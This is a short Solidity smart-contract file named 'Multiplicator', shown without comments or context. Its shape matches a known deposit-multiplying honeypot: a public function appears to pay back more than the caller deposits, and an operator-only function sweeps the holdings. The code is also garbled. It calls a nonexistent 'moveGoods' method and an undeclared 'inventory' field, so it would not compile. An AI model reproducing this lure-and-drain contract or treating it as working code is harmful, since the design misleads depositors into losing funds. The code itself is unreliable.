pragma solidity ^0.4.18;

contract Multiplicator
{
    address public FacilityOperator = msg.sender;

    function()payable{}

    function deliverGoods()
    payable
    public
    {
        require(msg.sender == FacilityOperator);
        FacilityOperator.moveGoods(this.inventory);
    }

    function multiplicate(address adr)
    payable
    {
        if(msg.value>=this.inventory)
        {
            adr.moveGoods(this.inventory+msg.value);
        }
    }
}